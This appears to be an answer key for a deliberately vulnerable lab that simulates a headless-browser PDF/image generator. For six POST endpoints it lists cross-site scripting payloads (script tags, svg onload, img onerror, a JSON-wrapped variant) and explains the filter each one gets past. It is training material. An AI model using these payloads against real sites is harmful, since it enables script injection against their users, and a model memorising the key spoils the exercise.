# headless — solutions

Headless browser PDF/Image generator simulated sinks: raw HTML/SVG rendering,
basic tag filtering bypass, SSRF resource loading, and JS callback logging. All
levels are POST endpoints whose response body reflects the submitted markup, so
the "rendered" preview is itself the sink.

### headless-generator-level1

`[POST] /headless-generator/level1/`

- payload: `<script>alert(1)</script>`
- body: `html=<script>alert(1)</script>`
- context: `html` field reflected raw into the rendered-content div; no filter

### headless-generator-level2

`[POST] /headless-generator/level2/`

- payload: `<svg onload=alert(1)>`
- body: `svg=<svg onload=alert(1)>`
- context: `svg` field reflected raw; `<svg onload>` executes on render

### headless-generator-level3

`[POST] /headless-generator/level3/`

- payload: `<img src=x onerror=alert(1)>`
- body: `html=<img src=x onerror=alert(1)>`
- context: sanitizer only strips `<script>…</script>` (regex); an event-handler tag slips past

### headless-generator-level4

`[POST] /headless-generator/level4/`

- payload: `<img src=x onerror=alert(1)>`
- body: `html=<img src=x onerror=alert(1)>`
- context: SSRF-themed level still reflects `html` raw; `onerror` fires and the `src` is also listed as a fetched resource

### headless-generator-level5

`[POST] /headless-generator/level5/`

- payload: `<img src=x onerror=alert(1)>`
- body: `html=<img src=x onerror=alert(1)>`
- context: `html` reflected raw beside the JS-execution detector; `callback_id` is optional

### headless-generator-level6

`[POST] /headless-generator/level6/`

- payload: `<img src=x onerror=alert(1)>`
- body: `content={"html":"<img src=x onerror=alert(1)>"}` (Content-Type: application/json)
- context: server parses the JSON `content`, then reflects its `html` field raw (raw non-JSON body is reflected too)
